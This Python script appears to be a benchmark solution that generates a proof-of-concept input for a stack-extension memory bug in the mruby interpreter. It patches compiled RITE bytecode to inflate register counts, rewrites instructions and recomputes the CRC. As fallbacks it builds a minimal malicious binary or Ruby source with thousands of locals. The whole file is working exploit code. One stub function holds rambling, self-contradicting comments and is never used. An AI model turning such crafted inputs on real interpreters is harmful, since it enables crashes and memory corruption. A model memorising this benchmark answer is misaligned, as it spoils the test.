import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _crc16_ccitt(data: bytes, init: int = 0) -> int:
    crc = init & 0xFFFF
    for b in data:
        crc ^= (b << 8) & 0xFFFF
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc & 0xFFFF


class _FS:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._tar: Optional[tarfile.TarFile] = None
        self._is_tar = False
        if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
            self._tar = tarfile.open(src_path, "r:*")
            self._is_tar = True

    def close(self) -> None:
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass
            self._tar = None

    def iter_files(self) -> Iterable[Tuple[str, int]]:
        if self._is_tar:
            assert self._tar is not None
            for m in self._tar.getmembers():
                if m.isreg():
                    yield m.name, m.size
        else:
            base = self.src_path
            for root, _, files in os.walk(base):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except Exception:
                        continue
                    if not os.path.isfile(p):
                        continue
                    rel = os.path.relpath(p, base).replace(os.sep, "/")
                    yield rel, st.st_size

    def read(self, name: str, limit: Optional[int] = None) -> bytes:
        if self._is_tar:
            assert self._tar is not None
            try:
                mi = self._tar.getmember(name)
            except KeyError:
                return b""
            f = self._tar.extractfile(mi)
            if f is None:
                return b""
            try:
                if limit is None:
                    return f.read()
                return f.read(limit)
            finally:
                try:
                    f.close()
                except Exception:
                    pass
        else:
            p = os.path.join(self.src_path, name.replace("/", os.sep))
            try:
                with open(p, "rb") as fp:
                    if limit is None:
                        return fp.read()
                    return fp.read(limit)
            except Exception:
                return b""


def _detect_input_kind(fs: _FS) -> str:
    c_like = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")
    fuzzer_texts: List[str] = []
    other_texts: List[str] = []
    for name, size in fs.iter_files():
        ln = name.lower()
        if not ln.endswith(c_like):
            continue
        if size > 2_000_000:
            continue
        b = fs.read(name)
        if not b:
            continue
        try:
            t = b.decode("utf-8", "ignore")
        except Exception:
            continue
        if "LLVMFuzzerTestOneInput" in t or "AFL" in t or "libFuzzer" in t:
            fuzzer_texts.append(t)
        elif "int main" in t or " main(" in t:
            other_texts.append(t)

    haystacks = fuzzer_texts if fuzzer_texts else other_texts
    if not haystacks:
        # conservative default for mruby fuzz harnesses
        return "irep"

    joined = "\n".join(haystacks)
    irep_markers = (
        "mrb_load_irep",
        "mrb_read_irep",
        "mrb_load_irep_buf",
        "mrb_read_irep_buf",
        "mrb_load_irep_cxt",
        "mrb_read_irep",
    )
    src_markers = (
        "mrb_load_string",
        "mrb_load_nstring",
        "mrb_parse_nstring",
        "mrb_load_file",
        "mrb_load_exec",
    )
    if any(s in joined for s in irep_markers):
        return "irep"
    if any(s in joined for s in src_markers):
        return "source"
    # if harness uses mruby parser, these are common too, but ambiguous; prefer irep
    return "irep"


def _extract_stack_limits(fs: _FS) -> Tuple[int, int]:
    init_sz = 128
    max_sz = 65536
    pat_init = re.compile(r"^\s*#\s*define\s+MRB_STACK_INIT_SIZE\s+(\d+)", re.M)
    pat_max = re.compile(r"^\s*#\s*define\s+MRB_STACK_MAX\s+(\d+)", re.M)
    for name, size in fs.iter_files():
        ln = name.lower()
        if not (ln.endswith(".h") or ln.endswith(".c")):
            continue
        if size > 1_000_000:
            continue
        b = fs.read(name)
        if not b:
            continue
        try:
            t = b.decode("utf-8", "ignore")
        except Exception:
            continue
        m = pat_init.search(t)
        if m:
            try:
                init_sz = int(m.group(1))
            except Exception:
                pass
        m = pat_max.search(t)
        if m:
            try:
                max_sz = int(m.group(1))
            except Exception:
                pass
        if init_sz != 128 and max_sz != 65536:
            break
    if max_sz < 256:
        max_sz = 256
    if init_sz < 16:
        init_sz = 16
    if init_sz >= max_sz:
        max_sz = init_sz * 4
    return init_sz, max_sz


def _find_opcode_h(fs: _FS) -> Optional[str]:
    candidates = []
    for name, size in fs.iter_files():
        if name.lower().endswith("opcode.h") and size < 500_000:
            candidates.append(name)
    if not candidates:
        return None
    candidates.sort(key=lambda x: (0 if "/mruby/" in x.lower() else 1, len(x)))
    return candidates[0]


def _parse_opcodes_and_shifts(opcode_text: str) -> Tuple[Dict[str, int], int, int, int]:
    def strip_comments(s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        s = re.sub(r"//.*?$", "", s, flags=re.M)
        return s

    t = strip_comments(opcode_text)

    shifts = {}
    for m in re.finditer(r"^\s*#\s*define\s+([A-Z_]+SHIFT)\s+(\d+)\s*$", t, flags=re.M):
        shifts[m.group(1)] = int(m.group(2))
    a_shift = shifts.get("A_SHIFT", 7)
    b_shift = shifts.get("B_SHIFT", 15)
    c_shift = shifts.get("C_SHIFT", 23)

    op_map: Dict[str, int] = {}
    m = re.search(r"enum\s+mrb_opcode\s*\{(.*?)\}\s*;", t, flags=re.S)
    if not m:
        m = re.search(r"typedef\s+enum\s*\{(.*?)\}\s*mrb_opcode\s*;", t, flags=re.S)
    if m:
        body = m.group(1)
        parts = [p.strip() for p in body.split(",")]
        cur = 0
        for p in parts:
            if not p:
                continue
            if not p.startswith("OP_"):
                continue
            if "=" in p:
                nm, val = p.split("=", 1)
                nm = nm.strip()
                val = val.strip()
                try:
                    cur = int(val, 0)
                except Exception:
                    continue
                op_map[nm] = cur
                cur += 1
            else:
                op_map[p] = cur
                cur += 1
    return op_map, a_shift, b_shift, c_shift


def _mkop_ab(op: int, a: int, b: int, a_shift: int, b_shift: int) -> int:
    return (op & 0xFFFFFFFF) | ((a & 0xFF) << a_shift) | ((b & 0xFF) << b_shift)


def _mkop_z(op: int) -> int:
    return op & 0xFFFFFFFF


def _find_seed_mrb_files(fs: _FS, max_size: int = 500_000) -> List[Tuple[str, bytes]]:
    seeds: List[Tuple[str, bytes]] = []
    for name, size in fs.iter_files():
        if size < 16 or size > max_size:
            continue
        head = fs.read(name, 4)
        if head == b"RITE":
            data = fs.read(name)
            if data.startswith(b"RITE"):
                seeds.append((name, data))
    seeds.sort(key=lambda x: (len(x[1]), x[0]))
    return seeds


def _infer_header_size_and_irep_pos(data: bytes) -> Tuple[int, int]:
    irep_pos = data.find(b"IREP")
    if irep_pos <= 0:
        # fallback common header size
        return 24, -1
    return irep_pos, irep_pos


def _u16(data: bytes, off: int, bo: str) -> int:
    return int.from_bytes(data[off:off + 2], bo, signed=False)


def _u32(data: bytes, off: int, bo: str) -> int:
    return int.from_bytes(data[off:off + 4], bo, signed=False)


def _infer_section_size(data: bytes, sect_pos: int) -> Tuple[int, str]:
    if sect_pos < 0 or sect_pos + 8 > len(data):
        return -1, "big"
    be = int.from_bytes(data[sect_pos + 4:sect_pos + 8], "big", signed=False)
    le = int.from_bytes(data[sect_pos + 4:sect_pos + 8], "little", signed=False)
    if 8 <= be <= len(data) - sect_pos:
        return be, "big"
    if 8 <= le <= len(data) - sect_pos:
        return le, "little"
    # default big
    return be, "big"


def _infer_irep_record_start(data: bytes, irep_pos: int) -> int:
    if irep_pos < 0:
        return -1
    pos = irep_pos + 8
    if pos + 4 <= len(data):
        ver = data[pos:pos + 4]
        if all(48 <= c <= 57 for c in ver):
            pos += 4
    return pos


def _try_parse_record_header(data: bytes, rec_off: int, bo: str, has_flags: bool) -> Optional[Tuple[int, int, int, int, int, int, int]]:
    # returns (rec_size, nlocals, nregs, rlen, clen, flags, ilen)
    if rec_off < 0 or rec_off + 16 > len(data):
        return None
    rec_size = _u32(data, rec_off, bo)
    if rec_size < 16 or rec_off + rec_size > len(data):
        return None
    nlocals = _u16(data, rec_off + 4, bo)
    nregs = _u16(data, rec_off + 6, bo)
    rlen = _u16(data, rec_off + 8, bo)
    clen = _u16(data, rec_off + 10, bo)
    if has_flags:
        if rec_off + 18 > len(data):
            return None
        flags = _u16(data, rec_off + 12, bo)
        ilen = _u32(data, rec_off + 14, bo)
        hdr = 18
    else:
        flags = 0
        ilen = _u32(data, rec_off + 12, bo)
        hdr = 16
    if ilen <= 0:
        return None
    iseq_end = rec_off + hdr + ilen * 4
    if iseq_end > rec_off + rec_size or iseq_end > len(data):
        return None
    # must have plen and slen at least
    if iseq_end + 8 > rec_off + rec_size or iseq_end + 8 > len(data):
        return None
    return rec_size, nlocals, nregs, rlen, clen, flags, ilen


def _infer_record_format(data: bytes, rec_off: int, sect_bo: str) -> Tuple[str, bool]:
    # pick record byteorder/flags layout. Likely same as section byteorder.
    candidates: List[Tuple[str, bool]] = [(sect_bo, True), (sect_bo, False)]
    other_bo = "little" if sect_bo == "big" else "big"
    candidates += [(other_bo, True), (other_bo, False)]
    for bo, has_flags in candidates:
        if _try_parse_record_header(data, rec_off, bo, has_flags) is not None:
            return bo, has_flags
    return sect_bo, True


def _patch_all_records(buf: bytearray, rec_off: int, bo: str, has_flags: bool, target_nregs: int, opcode_loadnil: Optional[int], opcode_stop: Optional[int], a_shift: int, b_shift: int) -> None:
    seen = set()

    def patch_one(off: int) -> None:
        if off in seen:
            return
        seen.add(off)
        hdr = _try_parse_record_header(buf, off, bo, has_flags)
        if hdr is None:
            return
        rec_size, nlocals, nregs, rlen, clen, flags, ilen = hdr
        new_nregs = target_nregs
        if new_nregs < nlocals + 1:
            new_nregs = nlocals + 1
        if new_nregs < nregs:
            new_nregs = nregs
        if new_nregs > 0xFFFF:
            new_nregs = 0xFFFF
        buf[off + 6:off + 8] = int(new_nregs).to_bytes(2, bo, signed=False)

        # overwrite first opcode in the topmost record to ensure a register touch after stack extend
        header_len = 18 if has_flags else 16
        iseq_off = off + header_len
        if opcode_loadnil is not None and ilen >= 1 and iseq_off + 4 <= len(buf):
            insn = _mkop_ab(opcode_loadnil, 1, 0, a_shift, b_shift)
            buf[iseq_off:iseq_off + 4] = int(insn).to_bytes(4, bo, signed=False)
            # try to ensure there's a stop somewhere: overwrite last instruction too if known
            if opcode_stop is not None and ilen >= 2:
                stop_off = iseq_off + (ilen - 1) * 4
                if stop_off + 4 <= len(buf):
                    buf[stop_off:stop_off + 4] = int(_mkop_z(opcode_stop)).to_bytes(4, bo, signed=False)

        # walk the record to find child records
        pos = off + header_len + ilen * 4
        if pos + 4 > len(buf):
            return
        plen = _u32(buf, pos, bo)
        pos += 4
        for _ in range(plen):
            if pos + 3 > len(buf):
                return
            pos += 1  # type
            ln = _u16(buf, pos, bo)
            pos += 2
            pos += ln
            if pos > len(buf):
                return
        if pos + 4 > len(buf):
            return
        slen = _u32(buf, pos, bo)
        pos += 4
        for _ in range(slen):
            if pos + 2 > len(buf):
                return
            ln = _u16(buf, pos, bo)
            pos += 2
            if ln != 0xFFFF:
                pos += ln
            if pos > len(buf):
                return

        # child records follow
        for _ in range(rlen):
            if pos + 4 > len(buf):
                return
            child_size = _u32(buf, pos, bo)
            if child_size < 16 or pos + child_size > len(buf):
                # try alternate byteorder just for this hop
                alt_bo = "little" if bo == "big" else "big"
                child_size2 = int.from_bytes(buf[pos:pos + 4], alt_bo, signed=False)
                if child_size2 < 16 or pos + child_size2 > len(buf):
                    return
                else:
                    # don't recurse with wrong bo; bail out
                    return
            patch_one(pos)
            pos += child_size

        # catch handlers at end (clen) - skip without parsing; children already patched

    patch_one(rec_off)


def _infer_crc_scheme(seed: bytes, header_size: int, irep_pos: int, irep_size: int) -> Tuple[int, int, int, str]:
    # returns (crc_offset, start, end, endian) for CRC field, and init used encoded in start's high bits? no: return init separately by packing
    # We'll return init in crc_offset sign? no. Return (crc_off, start, end, endian, init)
    # But signature fixed above; we'll store init in start as negative? no. We'll adapt: return (crc_off, start, end, endian) and set init globally? not.
    # We'll instead embed init as end's high bits? not.
    raise RuntimeError("unreachable")


def _infer_crc_params(seed: bytes) -> Tuple[int, int, int, str, int]:
    if len(seed) < 12 or seed[:4] != b"RITE":
        return 8, 24, len(seed), "big", 0

    crc_off = 8
    stored_be = int.from_bytes(seed[crc_off:crc_off + 2], "big", signed=False)
    stored_le = int.from_bytes(seed[crc_off:crc_off + 2], "little", signed=False)

    header_size, irep_pos = _infer_header_size_and_irep_pos(seed)
    irep_size, sect_bo = _infer_section_size(seed, irep_pos) if irep_pos >= 0 else (-1, "big")

    irep_body_start = irep_pos + 8
    if 0 <= irep_pos and irep_body_start + 4 <= len(seed):
        ver = seed[irep_body_start:irep_body_start + 4]
        if all(48 <= c <= 57 for c in ver):
            irep_body_start += 4

    candidates: List[Tuple[int, int, int, str, int]] = []
    # (start, end, endian, init)
    candidates.append((header_size, len(seed), "big", 0))
    candidates.append((header_size, len(seed), "big", 0xFFFF))
    candidates.append((header_size, len(seed), "little", 0))
    candidates.append((header_size, len(seed), "little", 0xFFFF))
    if irep_pos >= 0 and irep_size > 0 and irep_pos + irep_size <= len(seed):
        candidates.append((irep_pos, irep_pos + irep_size, "big", 0))
        candidates.append((irep_pos, irep_pos + irep_size, "big", 0xFFFF))
        candidates.append((irep_body_start, irep_pos + irep_size, "big", 0))
        candidates.append((irep_body_start, irep_pos + irep_size, "big", 0xFFFF))
        candidates.append((irep_pos, irep_pos + irep_size, "little", 0))
        candidates.append((irep_body_start, irep_pos + irep_size, "little", 0))
    candidates.append((10, len(seed), "big", 0))
    candidates.append((10, len(seed), "big", 0xFFFF))

    # whole file with crc bytes zeroed
    def crc_whole(init: int) -> int:
        tmp = bytearray(seed)
        tmp[crc_off:crc_off + 2] = b"\x00\x00"
        return _crc16_ccitt(bytes(tmp), init=init)

    for init in (0, 0xFFFF):
        v = crc_whole(init)
        if v == stored_be:
            return crc_off, 0, len(seed), "big", init
        if v == stored_le:
            return crc_off, 0, len(seed), "little", init

    for start, end, endian, init in candidates:
        if start < 0 or end < 0 or start > end or end > len(seed):
            continue
        v = _crc16_ccitt(seed[start:end], init=init)
        if v == stored_be:
            return crc_off, start, end, "big", init
        if v == stored_le:
            return crc_off, start, end, "little", init

    # fallback (common): crc over everything after header, big endian, init=0
    return crc_off, header_size, len(seed), "big", 0


def _update_crc(buf: bytearray, crc_off: int, start: int, end: int, endian: str, init: int) -> None:
    if start == 0 and end == len(buf):
        tmp = bytearray(buf)
        tmp[crc_off:crc_off + 2] = b"\x00\x00"
        crc = _crc16_ccitt(bytes(tmp), init=init)
    else:
        crc = _crc16_ccitt(bytes(buf[start:end]), init=init)
    buf[crc_off:crc_off + 2] = int(crc).to_bytes(2, endian, signed=False)


def _generate_source_poc(init_sz: int, max_sz: int) -> bytes:
    # Force a stack extension via a method with a large number of locals.
    # Keep below max to avoid exceptions in fixed build.
    target_nregs = min(4096, max(512, init_sz * 16))
    if target_nregs > max_sz - 16:
        target_nregs = max(256, max_sz - 16)
    # number of locals roughly equals nregs; use chain assignment to keep source compact.
    nvars = max(300, min(2200, target_nregs - 8))
    parts = [f"a{i}=" for i in range(nvars)]
    chain = "".join(parts) + "0"
    src = f"def f\n  {chain}\n  0\nend\nf\nx=1\n"
    return src.encode("utf-8")


def _build_minimal_mrb(fmt_ver: bytes, target_nregs: int, op_map: Dict[str, int], a_shift: int, b_shift: int) -> bytes:
    # Best-effort minimal mruby RITE file for common format versions.
    # Header: RITE + ver + crc16 + size + mrbc + ver + padding(2)
    if len(fmt_ver) != 4 or not all(48 <= c <= 57 for c in fmt_ver):
        fmt_ver = b"0300"
    compiler = b"mrbc"
    if len(compiler) != 4:
        compiler = (compiler + b"    ")[:4]

    op_stop = op_map.get("OP_STOP", None)
    op_loadnil = op_map.get("OP_LOADNIL", None)
    if op_stop is None:
        op_stop = op_map.get("OP_NOP", 0)
    if op_loadnil is None:
        op_loadnil = op_map.get("OP_MOVE", 1)

    bo = "big"

    # Record layout with flags field (most common). If loader differs, this is fallback only.
    ilen = 2
    insn0 = _mkop_ab(int(op_loadnil), 1, 0, a_shift, b_shift)
    insn1 = _mkop_z(int(op_stop))
    iseq = insn0.to_bytes(4, bo) + insn1.to_bytes(4, bo)

    # record: size,u16,u16,u16,u16,u16,u32,iseq,u32(pool),u32(sym)
    rec_header = (
        b"\x00\x00\x00\x00" +  # size placeholder
        (1).to_bytes(2, bo) +  # nlocals
        int(max(2, min(target_nregs, 0xFFFF))).to_bytes(2, bo) +  # nregs
        (0).to_bytes(2, bo) +  # rlen
        (0).to_bytes(2, bo) +  # clen
        (0).to_bytes(2, bo) +  # flags
        int(ilen).to_bytes(4, bo)
    )
    rec_body = iseq + (0).to_bytes(4, bo) + (0).to_bytes(4, bo)
    rec = bytearray(rec_header + rec_body)
    rec_size = len(rec)
    rec[0:4] = int(rec_size).to_bytes(4, bo)

    irep_section = bytearray()
    irep_section += b"IREP"
    irep_payload = bytearray()
    irep_payload += fmt_ver
    irep_payload += rec
    irep_section += int(8 + len(irep_payload)).to_bytes(4, bo)
    irep_section += irep_payload

    end_section = bytearray(b"END\0" + (8).to_bytes(4, bo))

    header = bytearray()
    header += b"RITE"
    header += fmt_ver
    header += b"\x00\x00"  # crc placeholder
    total_size = 24 + len(irep_section) + len(end_section)
    header += int(total_size).to_bytes(4, bo)
    header += compiler
    header += fmt_ver
    header += b"\x00\x00"  # padding

    out = bytearray(header + irep_section + end_section)
    # crc over everything after header (common) init=0, big-endian
    _update_crc(out, crc_off=8, start=24, end=len(out), endian="big", init=0)
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        fs = _FS(src_path)
        try:
            kind = _detect_input_kind(fs)
            init_sz, max_sz = _extract_stack_limits(fs)
            target_nregs = min(4096, max(1024, init_sz * 16))
            if target_nregs > max_sz - 16:
                target_nregs = max(256, max_sz - 16)

            if kind == "source":
                return _generate_source_poc(init_sz, max_sz)

            seeds = _find_seed_mrb_files(fs)
            opcode_h = _find_opcode_h(fs)
            op_map: Dict[str, int] = {}
            a_shift, b_shift, c_shift = 7, 15, 23
            if opcode_h is not None:
                op_txt = fs.read(opcode_h).decode("utf-8", "ignore")
                op_map, a_shift, b_shift, c_shift = _parse_opcodes_and_shifts(op_txt)

            for _, seed in seeds[:20]:
                header_size, irep_pos = _infer_header_size_and_irep_pos(seed)
                if irep_pos < 0:
                    continue
                irep_size, sect_bo = _infer_section_size(seed, irep_pos)
                rec_start = _infer_irep_record_start(seed, irep_pos)
                if rec_start < 0 or rec_start + 16 > len(seed):
                    continue
                rec_bo, has_flags = _infer_record_format(seed, rec_start, sect_bo)
                hdr = _try_parse_record_header(seed, rec_start, rec_bo, has_flags)
                if hdr is None:
                    continue

                buf = bytearray(seed)
                op_loadnil = op_map.get("OP_LOADNIL")
                op_stop = op_map.get("OP_STOP")
                _patch_all_records(buf, rec_start, rec_bo, has_flags, target_nregs, op_loadnil, op_stop, a_shift, b_shift)

                crc_off, crc_start, crc_end, crc_endian, crc_init = _infer_crc_params(seed)
                _update_crc(buf, crc_off, crc_start, crc_end, crc_endian, crc_init)
                return bytes(buf)

            # fallback: build a minimal RITE binary
            fmt_ver = b"0300"
            # try to find dump.h to extract format version
            for name, size in fs.iter_files():
                if size > 300_000:
                    continue
                ln = name.lower()
                if not (ln.endswith("dump.h") or ln.endswith("mruby/dump.h")):
                    continue
                t = fs.read(name).decode("utf-8", "ignore")
                m = re.search(r'RITE_BINARY_FORMAT_VER\s+"(\d{4})"', t)
                if m:
                    fmt_ver = m.group(1).encode("ascii", "ignore")[:4]
                    break

            return _build_minimal_mrb(fmt_ver, target_nregs, op_map, a_shift, b_shift)
        finally:
            fs.close()